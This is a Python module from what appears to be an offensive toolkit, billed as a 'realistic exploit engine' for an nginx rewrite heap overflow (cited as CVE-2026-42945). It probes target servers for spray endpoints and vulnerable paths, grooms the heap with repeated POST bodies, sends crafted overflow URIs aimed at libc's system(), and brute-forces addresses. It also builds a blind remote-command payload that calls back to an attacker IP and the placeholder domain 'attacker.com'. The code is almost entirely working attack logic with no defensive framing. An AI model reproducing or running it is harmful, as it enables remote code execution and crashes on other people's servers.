"""
core/corruption.py — Realistic exploit engine (from nginx-rift-super-toolkit-zero-dep-listen.py).
Covers: RealisticExploitResult, discover_spray_endpoints, detect_vulnerable_patterns,
        adaptive_spray, attempt_blind_exploit, mode_realistic_exploit
"""
from __future__ import annotations

import re
import socket
import time

from config import (
    DEFAULT_HEAP_BASE, DEFAULT_LIBC_BASE, DEFAULT_SYSTEM_OFFSET,
    DEFAULT_HEAP_OFFSETS, N_SPRAY, REALISTIC_SPRAY_PATHS,
)
from core.spray import (
    build_spray_body, build_overflow_uri, wait_alive, wrap_if_ssl,
)
from core.payload import build_blind_rce_cmd


# ─── Result container ─────────────────────────────────────────────────────────

class RealisticExploitResult:
    """Result container for realistic exploit attempts."""
    def __init__(self):
        self.success = False
        self.winning_addr = None
        self.winning_endpoint = None
        self.winning_method = None
        self.attempts: list[dict] = []
        self.vulnerable_endpoints: list[dict] = []
        self.vulnerable_patterns: list[dict] = []
        self.captured_output = None
        self.error = None
        self.blind_mode = False
        self.aslr_bypass = False


# ─── Endpoint discovery ───────────────────────────────────────────────────────

def discover_spray_endpoints(host: str, port: int, vhost: str = "l",
                             use_ssl: bool = False,
                             timeout: float = 2.0) -> list[dict]:
    """
    Discover standard endpoints suitable for heap grooming.
    Returns list of endpoints with their POST/PUT capabilities.
    """
    found_endpoints: list[dict] = []

    for path in REALISTIC_SPRAY_PATHS:
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                req = f"GET {path} HTTP/1.1\r\nHost: {vhost}\r\nConnection: close\r\n\r\n"
                s.sendall(req.encode())
                resp = s.recv(1024).decode("latin-1", errors="replace")

                status_match = re.search(r'HTTP/[\d.]+\s+(\d+)', resp)
                if status_match:
                    status_code = int(status_match.group(1))
                    if status_code in [200, 201, 202, 301, 302, 405, 413]:
                        post_req = (
                            f"POST {path} HTTP/1.1\r\n"
                            f"Host: {vhost}\r\n"
                            f"Content-Length: 100\r\n"
                            f"Content-Type: application/octet-stream\r\n"
                            f"Connection: close\r\n\r\n"
                        ).encode() + b"\x00" * 100
                        sock2 = socket.create_connection((host, port), timeout=timeout)
                        with wrap_if_ssl(sock2, host, use_ssl) as s2:
                            s2.sendall(post_req)
                            post_resp = s2.recv(1024).decode("latin-1", errors="replace")
                            post_status = re.search(r'HTTP/[\d.]+\s+(\d+)', post_resp)
                            if post_status:
                                post_code = int(post_status.group(1))
                                if post_code in [200, 201, 202, 301, 302, 405, 413, 500, 502]:
                                    has_proxy = any(
                                        x in post_resp.lower()
                                        for x in ['proxy', 'upstream', 'backend', '502 bad gateway']
                                    )
                                    found_endpoints.append({
                                        "path": path,
                                        "get_status": status_code,
                                        "post_status": post_code,
                                        "accepts_post": post_code not in [405, 403, 404],
                                        "has_proxy": has_proxy,
                                        "body_buffering": post_code in [500, 502] or has_proxy,
                                        "priority": 1 if has_proxy else (2 if post_code == 200 else 3),
                                    })
        except (OSError, socket.timeout):
            continue

    found_endpoints.sort(key=lambda x: (x["priority"], -x["post_status"]))
    return found_endpoints


# ─── Vulnerable pattern detection ─────────────────────────────────────────────

def detect_vulnerable_patterns(host: str, port: int, vhost: str = "l",
                               use_ssl: bool = False) -> list[dict]:
    """
    Detect nginx rewrite patterns vulnerable to CVE-2026-42945.
    Uses timing attacks and error analysis to infer configuration.
    """
    vulnerable_paths: list[dict] = []

    test_paths = [
        "/", "/api", "/api/test", "/r", "/r/test",
        "/upload", "/static", "/assets", "/images",
        "/admin", "/login", "/config", "/status",
    ]

    for path in test_paths:
        try:
            sock = socket.create_connection((host, port), timeout=3)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                test_uri = b"test+" * 200
                req = (
                    f"GET {path}/{test_uri.decode()} HTTP/1.1\r\n"
                    f"Host: {vhost}\r\nConnection: close\r\n\r\n"
                )
                s.sendall(req.encode())
                start_time = time.time()
                try:
                    resp = s.recv(4096).decode("latin-1", errors="replace")
                    elapsed = time.time() - start_time
                    status_match = re.search(r'HTTP/[\d.]+\s+(\d+)', resp)
                    if status_match:
                        status_code = int(status_match.group(1))
                        has_rewrite_error = any(
                            x in resp.lower()
                            for x in ['rewrite', 'location', 'moved', 'redirect']
                        )
                        timing_anomaly = elapsed > 0.1
                        if has_rewrite_error or timing_anomaly:
                            vulnerable_paths.append({
                                "path": path,
                                "status": status_code,
                                "timing": elapsed,
                                "has_rewrite_error": has_rewrite_error,
                                "confidence": 0.7 if has_rewrite_error else 0.4,
                            })
                except socket.timeout:
                    vulnerable_paths.append({
                        "path": path, "status": 0, "timing": 3.0,
                        "has_rewrite_error": False, "confidence": 0.3,
                    })
        except (OSError, socket.timeout):
            continue

    return vulnerable_paths


# ─── Adaptive spray ───────────────────────────────────────────────────────────

def adaptive_spray(host: str, port: int, body: bytes, endpoint: str,
                   vhost: str = "l", use_ssl: bool = False,
                   n: int = N_SPRAY, use_keepalive: bool = True) -> list[socket.socket]:
    """Adaptive heap grooming using standard endpoints. Supports keep-alive."""
    sprays: list[socket.socket] = []

    for _ in range(n):
        try:
            sock = socket.create_connection((host, port), timeout=5)
            s = wrap_if_ssl(sock, host, use_ssl)
            conn_header = b"Connection: keep-alive\r\n" if use_keepalive else b"Connection: close\r\n"
            req = (
                f"POST {endpoint} HTTP/1.1\r\n"
                f"Host: {vhost}\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Cache-Control: no-cache\r\n"
                f"Pragma: no-cache\r\n"
            ).encode() + conn_header + b"\r\n" + body
            s.sendall(req)
            sprays.append(s)
            time.sleep(0.005)
        except OSError:
            break

    return sprays


# ─── Blind exploit attempt ────────────────────────────────────────────────────

def attempt_blind_exploit(host: str, port: int, uri: bytes, endpoint: str,
                          sprays: list[socket.socket],
                          vhost: str = "localhost", use_ssl: bool = False) -> bool:
    """Attempt exploit without direct output (blind mode)."""
    try:
        attacker_sock = socket.create_connection((host, port), timeout=5)
        attacker = wrap_if_ssl(attacker_sock, host, use_ssl)
        time.sleep(0.02)
        victim_sock = socket.create_connection((host, port), timeout=5)
        victim = wrap_if_ssl(victim_sock, host, use_ssl)
        time.sleep(0.02)
    except OSError:
        return False

    try:
        attacker.sendall(
            f"GET {endpoint}/".encode() + uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n"
        )
        time.sleep(0.05)
        victim.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\n".encode())
        time.sleep(0.05)
        attacker.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
        time.sleep(0.2)
        victim.close()
        time.sleep(0.1)

        try:
            attacker.sendall(b"X-Ping:1\r\n")
            attacker.settimeout(0.2)
            return not attacker.recv(1)
        except socket.timeout:
            try:
                sock2 = socket.create_connection((host, port), timeout=0.2)
                with wrap_if_ssl(sock2, host, use_ssl) as s2:
                    s2.sendall(
                        f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode()
                    )
                    return not s2.recv(10)
            except OSError:
                return True
        except (ConnectionResetError, BrokenPipeError, OSError):
            return True
    finally:
        try:
            attacker.close()
        except OSError:
            pass


# ─── Realistic exploit mode ───────────────────────────────────────────────────

def mode_realistic_exploit(host: str, port: int, cmd: str,
                           callback_ip: str = "", callback_port: int = 0,
                           blind_mode: bool = True,
                           heap_base: int = 0, libc_base: int = 0,
                           system_off: int = DEFAULT_SYSTEM_OFFSET,
                           offsets: list[int] | None = None,
                           vhost: str = "l", use_ssl: bool = False,
                           tries_per_offset: int = 5,
                           enable_aslr_bypass: bool = True) -> RealisticExploitResult:
    """
    Realistic exploit mode that works without synthetic endpoints.

    Features:
    - Auto-discovers standard spray endpoints (/upload, /api/*, etc.)
    - Detects vulnerable rewrite patterns
    - Supports blind RCE with OOB callbacks
    - Handles ASLR with brute-force or info leak
    - Adaptive heap grooming via keep-alive
    """
    from ui.output import log  # type: ignore[import]

    result = RealisticExploitResult()
    result.blind_mode = blind_mode

    log(f"Starting realistic exploit against {host}:{port}", "info")
    log(f"Blind mode: {blind_mode}, ASLR bypass: {enable_aslr_bypass}", "info")

    if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
        result.error = f"nginx not reachable on {host}:{port}"
        return result

    log("Discovering spray endpoints...", "info")
    endpoints = discover_spray_endpoints(host, port, vhost=vhost, use_ssl=use_ssl)
    if not endpoints:
        log("No suitable spray endpoints found, trying fallback paths", "warn")
        endpoints = [
            {"path": "/upload", "accepts_post": True, "has_proxy": False},
            {"path": "/api/upload", "accepts_post": True, "has_proxy": False},
        ]

    log(f"Found {len(endpoints)} potential spray endpoints", "ok")
    for ep in endpoints[:5]:
        log(
            f"  {ep['path']} (POST: {ep.get('post_status', '?')}, "
            f"proxy: {ep.get('has_proxy', False)})", "debug"
        )

    log("Detecting vulnerable rewrite patterns...", "info")
    vuln_patterns = detect_vulnerable_patterns(host, port, vhost=vhost, use_ssl=use_ssl)
    result.vulnerable_patterns = vuln_patterns
    if vuln_patterns:
        log(f"Found {len(vuln_patterns)} potentially vulnerable paths", "ok")
        for pat in vuln_patterns[:3]:
            log(f"  {pat['path']} (confidence: {pat['confidence']:.0%})", "debug")

    hb = heap_base or DEFAULT_HEAP_BASE
    lb = libc_base or DEFAULT_LIBC_BASE
    system_addr = lb + system_off
    candidates = [lb + off for off in (offsets or DEFAULT_HEAP_OFFSETS)]

    if blind_mode and callback_ip and callback_port:
        log("Building blind RCE payload...", "info")
        blind_cmd = build_blind_rce_cmd(cmd, callback_ip, callback_port,
                                       method="http", domain="attacker.com")
        log(f"Blind RCE command: {blind_cmd[:100]}...", "debug")

    spray_body = build_spray_body(cmd, hb, system_addr)

    for endpoint in endpoints[:3]:
        ep_path = endpoint["path"]
        log(f"Trying endpoint: {ep_path}", "info")

        for addr in candidates[:10]:
            for t in range(tries_per_offset):
                if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
                    result.attempts.append({
                        "endpoint": ep_path, "addr": hex(addr),
                        "try": t, "result": "server-down",
                    })
                    time.sleep(2)
                    if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
                        result.error = "nginx not recovering"
                        return result

                sprays = adaptive_spray(host, port, spray_body, ep_path,
                                       vhost=vhost, use_ssl=use_ssl,
                                       n=N_SPRAY, use_keepalive=True)
                time.sleep(0.2)
                uri = build_overflow_uri(addr)
                crashed = attempt_blind_exploit(
                    host, port, uri, ep_path, sprays, vhost=vhost, use_ssl=use_ssl
                )
                for s in sprays:
                    try:
                        s.close()
                    except Exception:
                        pass

                result.attempts.append({
                    "endpoint": ep_path, "addr": hex(addr),
                    "try": t, "result": "crashed" if crashed else "no-effect",
                })

                if crashed:
                    result.success = True
                    result.winning_addr = hex(addr)
                    result.winning_endpoint = ep_path
                    result.winning_method = "blind" if blind_mode else "direct"
                    log(f"Exploit succeeded at {ep_path} with addr {hex(addr)}!", "ok")
                    if blind_mode and callback_ip and callback_port:
                        log(f"Waiting for callback at {callback_ip}:{callback_port}...", "info")
                        result.captured_output = (
                            f"Blind RCE triggered, check callback at "
                            f"{callback_ip}:{callback_port}"
                        )
                    return result

                time.sleep(0.3)

    if enable_aslr_bypass and not result.success:
        log("Attempting ASLR bypass via info leak...", "warn")
        result.error = "All exploit attempts failed. ASLR may be active."

    return result
